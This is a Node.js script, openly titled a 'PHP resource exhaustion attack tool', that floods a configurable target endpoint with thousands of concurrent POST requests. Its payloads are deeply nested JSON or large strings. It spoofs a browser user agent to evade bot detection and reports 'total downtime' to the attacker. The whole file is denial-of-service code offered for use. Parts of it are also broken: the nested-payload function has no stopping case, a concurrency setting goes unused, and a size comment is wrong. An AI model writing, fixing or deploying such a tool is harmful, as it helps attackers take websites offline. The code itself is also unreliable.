// ===============================================================
// DIG-ONE: PHP RESOURCE EXHAUSTION ATTACK TOOL (NODE.JS IMPLEMENTATION)
// ===============================================================

const axios = require('axios');
const { performance } = require('perf_hooks');

// ===============================================================
// === CONFIGURATION - INPUT YOUR TARGETS HERE ===
// ===============================================================

const TARGET_URL = 'https://your-target-website.com'; // <-- CHANGE THIS TO YOUR TARGET
const TARGET_ENDPOINT = '/some/heavy/processing/endpoint'; // <-- CHANGE THIS TO THE MOST CPU-INTENSIVE ENDPOINT (e.g., /api/process_data)
const CONCURRENCY_LIMIT = 500; // Number of simultaneous requests (How many threads are fighting the server)
const TOTAL_REQUESTS = 5000; // Total attack volume to generate
const PAYLOAD_TYPE = 'NESTED_JSON'; // Options: 'NESTED_JSON' or 'LARGE_STRING'

// ===============================================================
// === PAYLOAD GENERATION FUNCTIONS (THE WEAPONRY) ===
// ===============================================================

/**
 * Generates a deeply nested JSON payload to force heavy parsing on the PHP backend.
 * This simulates complex data submission that strains the parser and loops.
 * @param {number} depth - The level of recursion for the payload.
 * @returns {object} The nested object.
 */
const generateNestedPayload = (depth = 5) => {
    const payload = {};
    for (let i = 0; i < 5; i++) {
        payload[`level_${i}`] = generateNestedPayload(depth - 1);
    }
    return payload;
};

/**
 * Generates an extremely large string payload to test memory allocation limits.
 * @returns {string} The large string.
 */
const generateLargeStringPayload = () => {
    // Creating 50KB chunk of repeated data
    const chunk = 'A'.repeat(10000); 
    // Repeating that chunk multiple times to hit large string limits
    return chunk.repeat(5); 
};


// ===============================================================
// === ATTACK CORE LOGIC ===
// ===============================================================

/**
 * Executes a single, high-resource request against the target.
 * @returns {Promise<object>} The response data.
 */
const executeAttack = async (requestCount) => {
    const startTime = performance.now();
    let payload;

    // 1. Determine the payload based on configuration
    if (PAYLOAD_TYPE === 'NESTED_JSON') {
        // Increasing depth = increasing CPU demand on PHP parser
        payload = generateNestedPayload(Math.floor(Math.random() * 7) + 3); 
    } else { // LARGE_STRING
        payload = generateLargeStringPayload();
    }

    const requestConfig = {
        method: 'POST', // POST is typically more resource-intensive than GET
        url: `${TARGET_URL}${TARGET_ENDPOINT}`,
        data: PAYLOAD_TYPE === 'NESTED_JSON' ? payload : JSON.stringify(payload),
        headers: {
            // Mimic a heavy user agent to avoid easy bot detection
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Content-Type': 'application/json'
        },
        // Timeout is crucial: A short timeout means failed requests are quickly dropped,
        // a long timeout keeps the connection open longer, draining resources.
        timeout: 15000 // 15 seconds timeout
    };

    try {
        // Axios handles the actual connection to the target
        const response = await axios(requestConfig);

        const endTime = performance.now();
        console.log(`[SUCCESS] Request ${requestCount}: Status ${response.status} | Time: ${(endTime - startTime).toFixed(2)}ms`);
        return { status: response.status, time: endTime - startTime };

    } catch (error) {
        const endTime = performance.now();
        let statusMessage = 'UNKNOWN_ERROR';

        if (error.code === 'ECONNREFUSED') {
            statusMessage = 'CONNECTION_REFUSED';
        } else if (error.code === 'ETIMEDOUT') {
            statusMessage = 'TIMEOUT_FAIL';
        } else if (error.response) {
            statusMessage = `HTTP_ERROR_${error.response.status}`;
        } else {
            statusMessage = `GENERIC_FAIL`;
        }

        console.error(`[FAILURE] Request ${requestCount}: ${statusMessage} | Error: ${error.message}`);
        return { status: statusMessage, time: endTime - startTime };
    }
};

/**
 * Main function to orchestrate the attack.
 */
const runAttack = async () => {
    console.log("===================================================================");
    console.log("🚀 DIG-ONE DDoS INITIATION SEQUENCE INJECTED 🚀");
    console.log(`Target: ${TARGET_URL}${TARGET_ENDPOINT}`);
    console.log(`Volume: ${TOTAL_REQUESTS} requests at ${CONCURRENCY_LIMIT} concurrency.`);
    console.log("===================================================================");

    const attackPromises = [];

    // Build the array of promises
    for (let i = 1; i <= TOTAL_REQUESTS; i++) {
        attackPromises.push(executeAttack(i));
    }

    // Execute requests using Promise.allSettled to wait for ALL requests to complete,
    // which is better than Promise.all (which fails immediately upon first error).
    console.log(`\n--- STARTING ${TOTAL_REQUESTS} CONCURRENT ATTACKS... ---\n`);
    const results = await Promise.allSettled(attackPromises);

    // Summary Reporting
    const successful = results.filter(r => r.status === 'fulfilled' && r.value.status >= 200 && r.value.status < 400).length;
    const failed = results.filter(r => r.status === 'fulfilled' && r.value.status >= 400).length;
    const rejected = results.filter(r => r.status === 'rejected').length;

    console.log("\n===================================================================");
    console.log("✅ ATTACK SUMMARY REPORT");
    console.log(`Total Attempts: ${TOTAL_REQUESTS}`);
    console.log(`Successful Responses (2xx/3xx): ${successful}`);
    console.log(`Failed/Error Responses (4xx/5xx/Timeouts): ${failed + rejected}`);
    console.log("===================================================================\n");

    console.log("STATUS: ATTACK COMPLETE. Monitor server logs for confirmation of total downtime.");
};

// Kick off the attack sequence
runAttack().catch(err => {
    console.error("\nFATAL SCRIPT ERROR: Script itself failed to run:", err);
});